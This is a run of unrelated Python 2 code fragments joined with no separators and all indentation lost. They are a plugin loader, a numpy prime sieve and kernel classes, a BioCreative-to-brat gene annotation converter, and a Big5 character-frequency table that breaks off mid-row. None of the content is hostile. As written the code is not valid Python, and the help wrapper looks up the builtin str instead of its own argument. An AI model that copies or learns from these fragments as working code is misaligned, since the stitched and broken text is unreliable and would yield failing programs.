name, ext = os.path.splitext(filename)
if ext != '.py':
continue
try:
plugin_module = __import__(name)
except ImportError, ex:
print >> sys.stderr, "Could not load plugin %r: %s" % (filename, str(ex))
continue
try:
plugin_func = plugin_module.register
except AttributeError:
print >> sys.stderr, "Plugin %r has no 'register' function" % name
else:
register_plugin(plugin_func, name, plugin_module)
sys.path = old_path
import numpy as np
import numpy.linalg as la
def prime_sieve(n):
is_prime = np.ones((n, ), dtype=bool)
is_prime[:2] = 0
N_max = int(np.sqrt(len(is_prime)))
for j in xrange(2, N_max+1):
is_prime[2*j::j] = False
return is_prime
def sort(x):
return np.argsort(x)
def help(s):
np.lookfor(str)
def arange(b, e, s):
return np.arange(b, e, s)
if __name__=="__main__":
print np.arange(1000)
print prime_sieve(100)
class Kernel(object):
def apply(self, **kwargs):
raise NotImplementedError("Not implemented")
class QuadraticKernel(Kernel):
def apply(self, X, Y, x):
ret = np.dot(X.T, x)
ret += 1
ret = np.power(ret, 2)
d, T = x.shape
ret = np.multiply(ret, np.repeat(Y[:, np.newaxis], repeats=T, axis=1))
ret = np.sum(ret, axis=0)
return ret
class RbfKernel(Kernel):
def __init__(self, sigma):
self.sigma = sigma
super(RbfKernel, self).__init__()
def apply(self, X, Y, x):
d, T = x.shape
_, N = X.shape
ret = np.zeros((N, T))
for i in xrange(T):
point = x[:, i]
cur = X - np.repeat(point[:, np.newaxis], repeats=N, axis=1)
cur = np.linalg.norm(cur, axis=0)
cur = -np.power(cur, 2)
cur = np.exp(cur/(2*self.sigma**2))
cur = np.multiply(cur, Y)
ret[:, i] = cur
ret = np.sum(ret, axis=0)
return ret
from __future__ import with_statement
import sys
import re
import os
def char_offsets(text, start, end, ttext):
idx, nospcidx = 0,0
while True:
while idx < len(text) and text[idx].isspace():
idx += 1
assert idx < len(text), "Error in data"
if nospcidx == start:
break
nospcidx += 1
idx += 1
char_start = idx
while nospcidx < end:
nospcidx += 1
idx += 1
while idx < len(text) and text[idx].isspace():
idx += 1
char_end = idx+1
if (text[char_start:char_end] == '/translation upstream factor' and
ttext                     == 'translation upstream factor'):
print >> sys.stderr, "NOTE: applying special-case fix ..."
char_start += 1
ref_text = text[char_start:char_end]
assert ref_text == ttext, "Mismatch: '%s' vs '%s' [%d:%d] (%s %d-%d)" % (ttext, ref_text, char_start, char_end, text, start, end)
return char_start, char_end
def main(argv):
if len(argv) != 4:
print >> sys.stderr, "Usage:", argv[0], "BC2TEXT BC2TAGS OUTPUT-DIR"
return 1
textfn, tagfn, outdir = argv[1:]
tags = {}
with open(tagfn, 'rU') as tagf:
for l in tagf:
l = l.rstrip('\n')
m = re.match(r'^([^\|]+)\|(\d+) (\d+)\|(.*)$', l)
assert m, "Format error in %s: %s" % (tagfn, l)
sid, start, end, text = m.groups()
start, end = int(start), int(end)
if sid not in tags:
tags[sid] = []
tags[sid].append((start, end, text))
texts = {}
with open(textfn, 'rU') as textf:
for l in textf:
l = l.rstrip('\n')
m = re.match(r'(\S+) (.*)$', l)
assert m, "Format error in %s: %s" % (textfn, l)
sid, text = m.groups()
assert sid not in texts, "Error: duplicate ID %s" % sid
texts[sid] = text
offsets = {}
for sid in texts:
offsets[sid] = []
for start, end, ttext in tags.get(sid,[]):
soff, eoff = char_offsets(texts[sid], start, end, ttext)
offsets[sid].append((soff, eoff))
for sid in texts:
with open(os.path.join(outdir, sid+".txt"), 'w') as txtf:
print >> txtf, texts[sid]
with open(os.path.join(outdir, sid+".ann"), 'w') as annf:
tidx = 1
for soff, eoff in offsets[sid]:
print >> annf, "T%d\tGENE %d %d\t%s" % (tidx, soff, eoff, texts[sid][soff:eoff])
tidx += 1
if __name__ == "__main__":
sys.exit(main(sys.argv))
BIG5_TYPICAL_DISTRIBUTION_RATIO = 0.75
BIG5_TABLE_SIZE = 5376
Big5CharToFreqOrder = (
1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110,
3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653,
1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932,
63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822,
3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013,
4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604,
5015,2501,1977,1978, 155,1991, 645, 641,1606,5016,3452, 337,  72, 406,5017,  80,
630, 238,3205,1509, 263, 939,1092,2654, 756,1440,1094,3453, 449,  69,2987, 591,
179,2096, 471, 115,2035,1844,  60,  50,2988, 134, 806,1869, 734,2036,3454, 180,
995,1607, 156, 537,2907, 688,5018, 319,1305, 779,2145, 514,2379, 298,4512, 359,
2502,  90,2716,1338, 663,  11, 906,1099,2553,  20,2441, 182, 532,1716,5019, 732,
1376,4204,1311,1420,3206,  25,2317,1056, 113, 399, 382,1950, 242,3455,2474, 529,
3276, 475,1447,3683,5020, 117,  21, 656, 810,1297,2300,2334,3557,5021, 126,4205,
706, 456, 150, 613,4513,  71,1118,2037,4206, 145,3092,  85, 835, 486,2115,1246,
1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,5022,2128,2359, 347,3815, 221,
3558,3135,5023,1956,1153,4207,  83, 296,1199,3093, 192, 624,  93,5024, 822,1898,
2823,3136, 795,2065, 991,1554,1542,1592,  27,  43,2867, 859, 139,1456, 860,4514,
437, 712,3974, 164,2397,3137, 695, 211,3037,2097, 195,3975,1608,3559,3560,3684,
3976, 234, 811,2989,2098,3977,2233,1441,3561,1615,2380, 668,2077,1638, 305, 228,
1664,4515, 467, 415,5025, 262,2099,1593, 239, 108, 300, 200,1033, 512,1247,2078,
5026,5027,2176,3207,3685,2682, 593, 845,1062,3277,  88,1723,2038,3978,1951, 212,
266, 152, 149, 468,1899,4208,4516,  77, 187,5028,3038,  37,   5,2990,5029,3979,
5030,5031,  39,2524,4517,2908,3208,2079,  55, 148,  74,4518, 545, 483,1474,1029,
1665, 217,1870,1531,3138,1104,2655,4209,  24, 172,3562, 900,3980,3563,3564,4519,
32,1408,2824,1312, 329, 487,2360,2251,2717, 784,2683,   4,3039,3351,1427,1789,
188, 109, 499,5032,3686,1717,1790, 888,1217,3040,4520,5033,3565,5034,3352,1520,
3687,3981, 196,1034, 775,5035,5036, 929,1816, 249, 439,  38,5037,1063,5038, 794,
3982,1435,2301,  46, 178,3278,2066,5039,2381,5040, 214,1709,4521, 804,  35, 707,
324,3688,1601,2554, 140, 459,4210,5041,5042,1365, 839, 272, 978,2262,2580,3456,
2129,1363,3689,1423, 697, 100,3094,  48,  70,1231, 495,3139,2196,5043,1294,5044,
2080, 462, 586,1042,3279, 853, 256, 988, 185,2382,3457,1698, 434,1084,5045,3458,
314,2625,2788,4522,2335,2336, 569,2285, 637,1817,2525, 757,1162,1879,1616,3459,
287,1577,2116, 768,4523,1671,2868,3566,2526,1321,3816, 909,2418,5046,4211, 933,
3817,4212,2053,2361,1222,4524, 765,2419,1322, 786,4525,5047,1920,1462,1677,2909,
1699,5048,4526,1424,2442,3140,3690,2600,3353,1775,1941,3460,3983,4213, 309,1369,
1130,2825, 364,2234,1653,1299,3984,3567,3985,3986,2656, 525,1085,3041, 902,2001,
1475, 964,4527, 421,1845,1415,1057,2286, 940,1364,3141, 376,4528,4529,1381,   7,
2527, 983,2383, 336,1710,2684,1846, 321,3461, 559,1131,3042,2752,1809,1132,1313,
265,1481,1858,5049, 352,1203,2826,3280, 167,1089, 420,2827, 776, 792,1724,3568,
4214,2443,3281,5050,4215,5051, 446, 229, 333,2753, 901,3818,1200,1557,4530,2657,
1921, 395,2754,2685,3819,4216,1836, 125, 916,3209,2626,4531,5052,5053,3820,5054,
5055,5056,4532,3142,3691,1133,2555,1757,3462,1510,2318,1409,3569,5057,2146, 438,
2601,2910,2384,3354,1068, 958,3043, 461, 311,2869,2686,4217,1916,3210,4218,1979,
383, 750,2755,2627,4219, 274, 539, 385,1278,1442,5058,1154,1965, 384, 561, 210,
98,1295,2556,3570,5059,1711,2420,1482,3463,3987,2911,1257, 129,5060,3821, 642,
523,2789,2790,2658,5061, 141,2235,1333,  68, 176, 441, 876, 907,4220, 603,2602,
710, 171,3464, 404, 549,  18,3143,2398,1410,3692,1666,5062,3571,4533,2912,4534,
5063,2991, 368,5064, 146, 366,  99, 871,3693,1543, 748, 807,1586,1185,  22,2263,
379,3822,3211,5065,3212, 505,1942,2628,1992,1382,2319,5066, 380,2362, 218, 702,
1818,1248,3465,3044,3572,3355,3282,5067,2992,3694, 930,3283,3823,5068,  59,5069,
585, 601,4221, 497,3466,1112,1314,4535,1802,5070,1223,1472,2177,5071, 749,1837,
690,1900,3824,1773,3988,1476, 429,1043,1791,2236,2117, 917,4222, 447,1086,1629,
5072, 556,5073,5074,2021,1654, 844,1090, 105, 550, 966,1758,2828,1008,1783, 686,
1095,5075,2287, 793,1602,5076,3573,2603,4536,4223,2948,2302,4537,3825, 980,2503,
544, 353, 527,4538, 908,2687,2913,5077, 381,2629,1943,1348,5078,1341,1252, 560,
3095,5079,3467,2870,5080,2054, 973, 886,2081, 143,4539,5081,5082, 157,3989, 496,
4224,  57, 840, 540,2039,4540,4541,3468,2118,1445, 970,2264,1748,1966,2082,4225,
3144,1234,1776,3284,2829,3695, 773,1206,2130,1066,2040,1326,3990,1738,1725,4226,
279,3145,  51,1544,2604, 423,1578,2131,2067, 173,4542,1880,5083,5084,1583, 264,
610,3696,4543,2444, 280, 154,5085,5086,5087,1739, 338,1282,3096, 693,2871,1411,
1074,3826,2445,5088,4544,5089,5090,1240, 952,2399,5091,2914,1538,2688, 685,1483,
4227,2475,1436, 953,4228,2055,4545, 671,2400,  79,4229,2446,3285, 608, 567,2689,
3469,4230,4231,1691, 393,1261,1792,2401,5092,4546,5093,5094,5095,5096,1383,1672,
3827,3213,1464, 522,1119, 661,1150, 216, 675,4547,3991,1432,3574, 609,4548,2690,
2402,5097,5098,5099,4232,3045,   0,5100,2476, 315, 231,2447, 301,3356,4549,2385,
5101, 233,4233,3697,1819,4550,4551,5102,  96,1777,1315,2083,5103, 257,5104,1810,
3698,2718,1139,1820,4234,2022,1124,2164,2791,1778,2659,5105,3097, 363,1655,3214,
5106,2993,5107,5108,5109,3992,1567,3993, 718, 103,3215, 849,1443, 341,3357,2949,
1484,5110,1712, 127,  67, 339,4235,2403, 679,1412, 821,5111,5112, 834, 738, 351,
2994,2147, 846, 235,1497,1881, 418,1993,3828,2719, 186,1100,2148,2756,3575,1545,
1355,2950,2872,1377, 583,3994,4236,2581,2995,5113,1298,3699,1078,2557,3700,2363,
78,3829,3830, 267,1289,2100,2002,1594,4237, 348, 369,1274,2197,2178,1838,4552,
1821,2830,3701,2757,2288,2003,4553,2951,2758, 144,3358, 882,4554,3995,2759,3470,
4555,2915,5114,4238,1726, 320,5115,3996,3046, 788,2996,5116,2831,1774,1327,2873,
3997,2832,5117,1306,4556,2004,1700,3831,3576,2364,2660, 787,2023, 506, 824,3702,
534, 323,4557,1044,3359,2024,1901, 946,3471,5118,1779,1500,1678,5119,1882,4558,
165, 243,4559,3703,2528, 123, 683,4239, 764,4560,  36,3998,1793, 589,2916, 816,
626,1667,3047,2237,1639,1555,1622,3832,3999,5120,4000,2874,1370,1228,1933, 891,
2084,2917, 304,4240,5121, 292,2997,2720,3577, 691,2101,4241,1115,4561, 118, 662,
5122, 611,1156, 854,2386,1316,2875,   2, 386, 515,2918,5123,5124,3286, 868,2238,
1486, 855,2661, 785,2216,3048,5125,1040,3216,3578,5126,3146, 448,5127,1525,5128,
2165,4562,5129,3833,5130,4242,2833,3579,3147, 503, 818,4001,3148,1568, 814, 676,
1444, 306,1749,5131,3834,1416,1030, 197,1428, 805,2834,1501,4563,5132,5133,5134,
1994,5135,4564,5136,5137,2198,  13,2792,3704,2998,3149,1229,1917,5138,3835,2132,
5139,4243,4565,2404,3580,5140,2217,1511,1727,1120,5141,5142, 646,3836,2448, 307,
5143,5144,1595,3217,5145,5146,5147,3705,1113,1356,4002,1465,2529,2530,5148, 519,
5149, 128,2133,  92,2289,1980,5150,4003,1512, 342,3150,2199,5151,2793,2218,1981,
3360,4244, 290,1656,1317, 789, 827,2365,5152,3837,4566, 562, 581,4004,5153, 401,
4567,2252,  94,4568,5154,1399,2794,5155,1463,2025,4569,3218,1944,5156, 828,1105,
4245,1262,1394,5157,4246, 605,4570,5158,1784,2876,5159,2835, 819,2102, 578,2200,
2952,5160,1502, 436,3287,4247,3288,2836,4005,2919,3472,3473,5161,2721,2320,5162,
5163,2337,2068,  23,4571, 193, 826,3838,2103, 699,1630,4248,3098, 390,1794,1064,
3581,5164,1579,3099,3100,1400,5165,4249,1839,1640,2877,5166,4572,4573, 137,4250,
598,3101,1967, 780, 104, 974,2953,5167, 278, 899, 253, 402, 572, 504, 493,1339,
5168,4006,1275,4574,2582,2558,5169,3706,3049,3102,2253, 565,1334,2722, 863,  41,
5170,5171,4575,5172,1657,2338,  19, 463,2760,4251, 606,5173,2999,3289,1087,2085,
1323,2662,3000,5174,1631,1623,1750,4252,2691,5175,2878, 791,2723,2663,2339, 232,
2421,5176,3001,1498,5177,2664,2630, 755,1366,3707,3290,3151,2026,1609, 119,1918,
3474, 862,1026,4253,5178,4007,3839,4576,4008,4577,2265,1952,2477,5179,1125, 817,
4254,4255,4009,1513,1766,2041,1487,4256,3050,3291,2837,3840,3152,5180,5181,1507,
5182,2692, 733,  40,1632,1106,2879, 345,4257, 841,2531, 230,4578,3002,1847,3292,
3475,5183,1263, 986,3476,5184, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562,
4010,4011,2954, 967,2761,2665,1349, 592,2134,1692,3361,3003,1995,4258,1679,4012,
1902,2188,5185, 739,3708,2724,1296,1290,5186,4259,2201,2202,1922,1563,2605,2559,
1871,2762,3004,5187, 435,5188, 343,1108, 596,  17,1751,4579,2239,3477,3709,5189,
4580, 294,3582,2955,1693, 477, 979, 281,2042,3583, 643,2043,3710,2631,2795,2266,
1031,2340,2135,2303,3584,4581, 367,1249,2560,5190,3585,5191,4582,1283,3362,2005,
240,1762,3363,4583,4584, 836,1069,3153, 474,5192,2149,2532, 268,3586,5193,3219,
1521,1284,5194,1658,1546,4260,5195,3587,3588,5196,4261,3364,2693,1685,4262, 961,
1673,2632, 190,2006,2203,3841,4585,4586,5197, 570,2504,3711,1490,5198,4587,2633,
3293,1957,4588, 584,1514, 396,1045,1945,5199,4589,1968,2449,5200,5201,4590,4013,
619,5202,3154,3294, 215,2007,2796,2561,3220,4591,3221,4592, 763,4263,3842,4593,
5203,5204,1958,1767,2956,3365,3712,1174, 452,1477,4594,3366,3155,5205,2838,1253,
2387,2189,1091,2290,4264, 492,5206, 638,1169,1825,2136,1752,4014, 648, 926,1021,
1324,4595, 520,4596, 997, 847,1007, 892,4597,3843,2267,1872,3713,2405,1785,4598,
1953,2957,3103,3222,1728,4265,2044,3714,4599,2008,1701,3156,1551,  30,2268,4266,
5207,2027,4600,3589,5208, 501,5209,4267, 594,3478,2166,1822,3590,3479,3591,3223,
829,2839,4268,5210,1680,3157,1225,4269,5211,3295,4601,4270,3158,2341,5212,4602,
4271,5213,4015,4016,5214,1848,2388,2606,3367,5215,4603, 374,4017, 652,4272,4273,
375,1140, 798,5216,5217,5218,2366,4604,2269, 546,1659, 138,3051,2450,4605,5219,
2254, 612,1849, 910, 796,3844,1740,1371, 825,3845,3846,5220,2920,2562,5221, 692,
444,3052,2634, 801,4606,4274,5222,1491, 244,1053,3053,4275,4276, 340,5223,4018,
1041,3005, 293,1168,  87,1357,5224,1539, 959,5225,2240, 721, 694,4277,3847, 219,
1478, 644,1417,3368,2666,1413,1401,1335,1389,4019,5226,5227,3006,2367,3159,1826,
730,1515, 184,2840,  66,4607,5228,1660,2958, 246,3369, 378,1457, 226,3480, 975,
4020,2959,1264,3592, 674, 696,5229, 163,5230,1141,2422,2167, 713,3593,3370,4608,
4021,5231,5232,1186,  15,5233,1079,1070,5234,1522,3224,3594, 276,1050,2725, 758,
1126, 653,2960,3296,5235,2342, 889,3595,4022,3104,3007, 903,1250,4609,4023,3481,
3596,1342,1681,1718, 766,3297, 286,  89,2961,3715,5236,1713,5237,2607,3371,3008,
5238,2962,2219,3225,2880,5239,4610,2505,2533, 181, 387,1075,4024, 731,2190,3372,
5240,3298, 310, 313,3482,2304, 770,4278,  54,3054, 189,4611,3105,3848,4025,5241,
1230,1617,1850, 355,3597,4279,4612,3373, 111,4280,3716,1350,3160,3483,3055,4281,
2150,3299,3598,5242,2797,4026,4027,3009, 722,2009,5243,1071, 247,1207,2343,2478,
1378,4613,2010, 864,1437,1214,4614, 373,3849,1142,2220, 667,4615, 442,2763,2563,
3850,4028,1969,4282,3300,1840, 837, 170,1107, 934,1336,1883,5244,5245,2119,4283,
2841, 743,1569,5246,4616,4284, 582,2389,1418,3484,5247,1803,5248, 357,1395,1729,
3717,3301,2423,1564,2241,5249,3106,3851,1633,4617,1114,2086,4285,1532,5250, 482,
2451,4618,5251,5252,1492, 833,1466,5253,2726,3599,1641,2842,5254,1526,1272,3718,
4286,1686,1795, 416,2564,1903,1954,1804,5255,3852,2798,3853,1159,2321,5256,2881,
4619,1610,1584,3056,2424,2764, 443,3302,1163,3161,5257,5258,4029,5259,4287,2506,
3057,4620,4030,3162,2104,1647,3600,2011,1873,4288,5260,4289, 431,3485,5261, 250,
97,  81,4290,5262,1648,1851,1558, 160, 848,5263, 866, 740,1694,5264,2204,2843,
3226,4291,4621,3719,1687, 950,2479, 426, 469,3227,3720,3721,4031,5265,5266,1188,
424,1996, 861,3601,4292,3854,2205,2694, 168,1235,3602,4293,5267,2087,1674,4622,
3374,3303, 220,2565,1009,5268,3855, 670,3010, 332,1208, 717,5269,5270,3603,2452,
4032,3375,5271, 513,5272,1209,2882,3376,3163,4623,1080,5273,5274,5275,5276,2534,
3722,3604, 815,1587,4033,4034,5277,3605,3486,3856,1254,4624,1328,3058,1390,4035,
1741,4036,3857,4037,5278, 236,3858,2453,3304,5279,5280,3723,3859,1273,3860,4625,
5281, 308,5282,4626, 245,4627,1852,2480,1307,2583, 430, 715,2137,2454,5283, 270,
199,2883,4038,5284,3606,2727,1753, 761,1754, 725,1661,1841,4628,3487,3724,5285,
5286, 587,  14,3305, 227,2608, 326, 480,2270, 943,2765,3607, 291, 650,1884,5287,
1702,1226, 102,1547,  62,3488, 904,4629,3489,1164,4294,5288,5289,1224,1548,2766,
391, 498,1493,5290,1386,1419,5291,2056,1177,4630, 813, 880,1081,2368, 566,1145,
4631,2291,1001,1035,2566,2609,2242, 394,1286,5292,5293,2069,5294,  86,1494,1730,
4039, 491,1588, 745, 897,2963, 843,3377,4040,2767,2884,3306,1768, 998,2221,2070,
397,1827,1195,1970,3725,3011,3378, 284,5295,3861,2507,2138,2120,1904,5296,4041,
2151,4042,4295,1036,3490,1905, 114,2567,4296, 209,1527,5297,5298,2964,2844,2635,
2390,2728,3164, 812,2568,5299,3307,5300,1559, 737,1885,3726,1210, 885,  28,2695,
3608,3862,5301,4297,1004,1780,4632,5302, 346,1982,2222,2696,4633,3863,1742, 797,
1642,4043,1934,1072,1384,2152, 896,4044,3308,3727,3228,2885,3609,5303,2569,1959,
4634,2455,1786,5304,5305,5306,4045,4298,1005,1308,3728,4299,2729,4635,4636,1528,
2610, 161,1178,4300,1983, 987,4637,1101,4301, 631,4046,1157,3229,2425,1343,1241,
1016,2243,2570, 372, 877,2344,2508,1160, 555,1935, 911,4047,5307, 466,1170, 169,
1051,2921,2697,3729,2481,3012,1182,2012,2571,1251,2636,5308, 992,2345,3491,1540,
2730,1201,2071,2406,1997,2482,5309,4638, 528,1923,2191,1503,1874,1570,2369,3379,
3309,5310, 557,1073,5311,1828,3492,2088,2271,3165,3059,3107, 767,3108,2799,4639,
1006,4302,4640,2346,1267,2179,3730,3230, 778,4048,3231,2731,1597,2667,5312,4641,
5313,3493,5314,5315,5316,3310,2698,1433,3311, 131,  95,1504,4049, 723,4303,3166,
1842,3610,2768,2192,4050,2028,2105,3731,5317,3013,4051,1218,5318,3380,3232,4052,
4304,2584, 248,1634,3864, 912,5319,2845,3732,3060,3865, 654,  53,5320,3014,5321,
1688,4642, 777,3494,1032,4053,1425,5322, 191, 820,2121,2846, 971,4643, 931,3233,
135, 664, 783,3866,1998, 772,2922,1936,4054,3867,4644,2923,3234, 282,2732, 640,
1372,3495,1127, 922, 325,3381,5323,5324, 711,2045,5325,5326,4055,2223,2800,1937,
4056,3382,2224,2255,3868,2305,5327,4645,3869,1258,3312,4057,3235,2139,2965,4058,
4059,5328,2225, 258,3236,4646, 101,1227,5329,3313,1755,5330,1391,3314,5331,2924,
2057, 893,5332,5333,5334,1402,4305,2347,5335,5336,3237,3611,5337,5338, 878,1325,
1781,2801,4647, 259,1385,2585, 744,1183,2272,4648,5339,4060,2509,5340, 684,1024,
4306,5341, 472,3612,3496,1165,3315,4061,4062, 322,2153, 881, 455,1695,1152,1340,
660, 554,2154,4649,1058,4650,4307, 830,1065,3383,4063,4651,1924,5342,1703,1919,
5343, 932,2273, 122,5344,4652, 947, 677,5345,3870,2637, 297,1906,1925,2274,4653,
2322,3316,5346,5347,4308,5348,4309,  84,4310, 112, 989,5349, 547,1059,4064, 701,
3613,1019,5350,4311,5351,3497, 942, 639, 457,2306,2456, 993,2966, 407, 851, 494,
4654,3384, 927,5352,1237,5353,2426,3385, 573,4312, 680, 921,2925,1279,1875, 285,
790,1448,1984, 719,2168,5354,5355,4655,4065,4066,1649,5356,1541, 563,5357,1077,
5358,3386,3061,3498, 511,3015,4067,4068,3733,4069,1268,2572,3387,3238,4656,4657,
5359, 535,1048,1276,1189,2926,2029,3167,1438,1373,2847,2967,1134,2013,5360,4313,
1238,2586,3109,1259,5361, 700,5362,2968,3168,3734,4314,5363,4315,1146,1876,1907,
4658,2611,4070, 781,2427, 132,1589, 203, 147, 273,2802,2407, 898,1787,2155,4071,
4072,5364,3871,2803,5365,5366,4659,4660,5367,3239,5368,1635,3872, 965,5369,1805,
2699,1516,3614,1121,1082,1329,3317,4073,1449,3873,  65,1128,2848,2927,2769,1590,
3874,5370,5371,  12,2668,  45, 976,2587,3169,4661, 517,2535,1013,1037,3240,5372,
3875,2849,5373,3876,5374,3499,5375,2612, 614,1999,2323,3877,3110,2733,2638,5376,
2588,4316, 599,1269,5377,1811,3735,5378,2700,3111, 759,1060, 489,1806,3388,3318,
1358,5379,5380,2391,1387,1215,2639,2256, 490,5381,5382,4317,1759,2392,2348,5383,
4662,3878,1908,4074,2640,1807,3241,4663,3500,3319,2770,2349, 874,5384,5385,3501,
3736,1859,  91,2928,3737,3062,3879,4664,5386,3170,4075,2669,5387,3502,1202,1403,
3880,2969,2536,1517,2510,4665,3503,2511,5388,4666,5389,2701,1886,1495,1731,4076,
2370,4667,5390,2030,5391,5392,4077,2702,1216, 237,2589,4318,2324,4078,3881,4668,
4669,2703,3615,3504, 445,4670,5393,5394,5395,5396,2771,  61,4079,3738,1823,4080,
5397, 687,2046, 935, 925, 405,2670, 703,1096,1860,2734,4671,4081,1877,1367,2704,
3389, 918,2106,1782,2483, 334,3320,1611,1093,4672, 564,3171,3505,3739,3390, 945,
2641,2058,4673,5398,1926, 872,4319,5399,3506,2705,3112, 349,4320,3740,4082,4674,
3882,4321,3741,2156,4083,4675,4676,4322,4677,2408,2047, 782,4084, 400, 251,4323,
1624,5400,5401, 277,3742, 299,1265, 476,1191,3883,2122,4324,4325,1109, 205,5402,
2590,1000,2157,3616,1861,5403,5404,5405,4678,5406,4679,2573, 107,2484,2158,4085,
3507,3172,5407,1533, 541,1301, 158, 753,4326,2886,3617,5408,1696, 370,1088,4327,
4680,3618, 579, 327, 440, 162,2244, 269,1938,1374,3508, 968,3063,  56,1396,3113,
2107,3321,3391,5409,1927,2159,4681,3016,5410,3619,5411,5412,3743,4682,2485,5413,
2804,5414,1650,4683,5415,2613,5416,5417,4086,2671,3392,1149,3393,4087,3884,4088,
5418,1076,  49,5419, 951,3242,3322,3323, 450,2850, 920,5420,1812,2805,2371,4328,
1909,1138,2372,3885,3509,5421,3243,4684,1910,1147,1518,2428,4685,3886,5422,4686,
2393,2614, 260,1796,3244,5423,5424,3887,3324, 708,5425,3620,1704,5426,3621,1351,
1618,3394,3017,1887, 944,4329,3395,4330,3064,3396,4331,5427,3744, 422, 413,1714,
3325, 500,2059,2350,4332,2486,5428,1344,1911, 954,5429,1668,5430,5431,4089,2409,
4333,3622,3888,4334,5432,2307,1318,2512,3114, 133,3115,2887,4687, 629,  31,2851,
2706,3889,4688, 850, 949,4689,4090,2970,1732,2089,4335,1496,1853,5433,4091, 620,
3245, 981,1242,3745,3397,1619,3746,1643,3326,2140,2457,1971,1719,3510,2169,5434,
3246,5435,5436,3398,1829,5437,1277,4690,1565,2048,5438,1636,3623,3116,5439, 869,
2852, 655,3890,3891,3117,4092,3018,3892,1310,3624,4691,5440,5441,5442,1733, 558,
4692,3747, 335,1549,3065,1756,4336,3748,1946,3511,1830,1291,1192, 470,2735,2108,
2806, 913,1054,4093,5443,1027,5444,3066,4094,4693, 982,2672,3399,3173,3512,3247,
3248,1947,2807,5445, 571,4694,5446,1831,5447,3625,2591,1523,2429,5448,2090, 984,
4695,3749,1960,5449,3750, 852, 923,2808,3513,3751, 969,1519, 999,2049,2325,1705,
5450,3118, 615,1662, 151, 597,4095,2410,2326,1049, 275,4696,3752,4337, 568,3753,
3626,2487,4338,3754,5451,2430,2275, 409,3249,5452,1566,2888,3514,1002, 769,2853,
194,2091,3174,3755,2226,3327,4339, 628,1505,5453,5454,1763,2180,3019,4096, 521,
1161,2592,1788,2206,2411,4697,4097,1625,4340,4341, 412,  42,3119, 464,5455,2642,
4698,3400,1760,1571,2889,3515,2537,1219,2207,3893,2643,2141,2373,4699,4700,3328,
1651,3401,3627,5456,5457,3628,2488,3516,5458,3756,5459,5460,2276,2092, 460,5461,
4701,5462,3020, 962, 588,3629, 289,3250,2644,1116,  52,5463,3067,1797,5464,5465,
5466,1467,5467,1598,1143,3757,4342,1985,1734,1067,4702,1280,3402, 465,4703,1572,
510,5468,1928,2245,1813,1644,3630,5469,4704,3758,5470,5471,2673,1573,1534,5472,
5473, 536,1808,1761,3517,3894,3175,2645,5474,5475,5476,4705,3518,2929,1912,2809,
5477,3329,1122, 377,3251,5478, 360,5479,5480,4343,1529, 551,5481,2060,3759,1769,
2431,5482,2930,4344,3330,3120,2327,2109,2031,4706,1404, 136,1468,1479, 672,1171,
3252,2308, 271,3176,5483,2772,5484,2050, 678,2736, 865,1948,4707,5485,2014,4098,
2971,5486,2737,2227,1397,3068,3760,4708,4709,1735,2931,3403,3631,5487,3895, 509,
2854,2458,2890,3896,5488,5489,3177,3178,4710,4345,2538,4711,2309,1166,1010, 552,
681,1888,5490,5491,2972,2973,4099,1287,1596,1862,3179, 358, 453, 736, 175, 478,
1117, 905,1167,1097,5492,1854,1530,5493,1706,5494,2181,3519,2292,3761,3520,3632,
4346,2093,4347,5495,3404,1193,2489,4348,1458,2193,2208,1863,1889,1421,3331,2932,
3069,2182,3521, 595,2123,5496,4100,5497,5498,4349,1707,2646, 223,3762,1359, 751,
3121, 183,3522,5499,2810,3021, 419,2374, 633, 704,3897,2394, 241,5500,5501,5502,
838,3022,3763,2277,2773,2459,3898,1939,2051,4101,1309,3122,2246,1181,5503,1136,
2209,3899,2375,1446,4350,2310,4712,5504,5505,4351,1055,2615, 484,3764,5506,4102,
625,4352,2278,3405,1499,4353,4103,5507,4104,4354,3253,2279,2280,3523,5508,5509,
2774, 808,2616,3765,3406,4105,4355,3123,2539, 526,3407,3900,4356, 955,5510,1620,
4357,2647,2432,5511,1429,3766,1669,1832, 994, 928,5512,3633,1260,5513,5514,5515,
1949,2293, 741,2933,1626,4358,2738,2460, 867,1184, 362,3408,1392,5516,5517,4106,
4359,1770,1736,3254,2934,4713,4714,1929,2707,1459,1158,5518,3070,3409,2891,1292,
1930,2513,2855,3767,1986,1187,2072,2015,2617,4360,5519,2574,2514,2170,3768,2490,
3332,5520,3769,4715,5521,5522, 666,1003,3023,1022,3634,4361,5523,4716,1814,2257,
574,3901,1603, 295,1535, 705,3902,4362, 283, 858, 417,5524,5525,3255,4717,4718,
3071,1220,1890,1046,2281,2461,4107,1393,1599, 689,2575, 388,4363,5526,2491, 802,
5527,2811,3903,2061,1405,2258,5528,4719,3904,2110,1052,1345,3256,1585,5529, 809,
5530,5531,5532, 575,2739,3524, 956,1552,1469,1144,2328,5533,2329,1560,2462,3635,
3257,4108, 616,2210,4364,3180,2183,2294,5534,1833,5535,3525,4720,5536,1319,3770,
3771,1211,3636,1023,3258,1293,2812,5537,5538,5539,3905, 607,2311,3906, 762,2892,
1439,4365,1360,4721,1485,3072,5540,4722,1038,4366,1450,2062,2648,4367,1379,4723,
2593,5541,5542,4368,1352,1414,2330,2935,1172,5543,5544,3907,3908,4724,1798,1451,
5545,5546,5547,5548,2936,4109,4110,2492,2351, 411,4111,4112,3637,3333,3124,4725,
1561,2674,1452,4113,1375,5549,5550,  47,2974, 316,5551,1406,1591,2937,3181,5552,
1025,2142,3125,3182, 354,2740, 884,2228,4369,2412, 508,3772, 726,3638, 996,2433,
3639, 729,5553, 392,2194,1453,4114,4726,3773,5554,5555,2463,3640,2618,1675,2813,
919,2352,2975,2353,1270,4727,4115,  73,5556,5557, 647,5558,3259,2856,2259,1550,
1346,3024,5559,1332, 883,3526,5560,5561,5562,5563,3334,2775,5564,1212, 831,1347,
4370,4728,2331,3909,1864,3073, 720,3910,4729,4730,3911,5565,4371,5566,5567,4731,
